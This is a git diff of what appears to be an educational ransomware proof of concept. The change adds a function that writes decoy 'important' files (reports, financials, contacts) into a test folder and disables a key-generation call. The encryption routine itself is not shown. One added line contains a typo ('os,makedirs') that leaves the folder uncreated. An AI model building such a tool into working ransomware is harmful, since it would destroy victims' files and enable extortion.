@@ -6,6 +6,8 @@ Disclaimer: this app written only and only for educational purpose
 
 import os
 import sys
+from os import makedirs
+
 import requests
 import json
 from Crypto.Cipher import AES
@@ -168,10 +170,39 @@ class EncryptionTool:
             logging.error(f"[-] Wallpaper Set Failed: Error {str(e)}")
 
 
+    # Function to Create Important Files on the target machine
+    def create_important_files(self, directory_path):
+        try:
+            # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
+            dDataPath = os.path.join(directory_path, "D-Data")
+            os,makedirs(dDataPath, exist_ok=True)
+
+            # Filenames must be created with fileContents
+            filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
+            fileContents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']
+
+            # Iterate on all filenames and file contents
+            for filename, content in zip(filenames, fileContents):
+                # join the filename path to the D-Data Directory path
+                filepath = os.path.join(dDataPath, filename)
+
+                # Create filename(important files) in the D-Data Directory
+                with open(filepath, 'w') as file:
+                    file.write(content)
+
+            # Submit an Info Log message of Important files created
+            logging.info(f"[+] Important Files Created Successfully in {dDataPath}.")
+        except Exception as e:
+            # Submit Error Log message from exception occurs
+            logging.error(f"Failed to create important files: {str(e)}")
+
+
+
+
 
 
 if __name__ == "__main__":
     # Create an instance of the EncryptionTool class
     encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
                                     password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
-    encryptionTool.generate_key(PASSWORD_PROVIDED)
+    # encryptionTool.create_important_files(r"H:/Repo/RansomPOC/test")
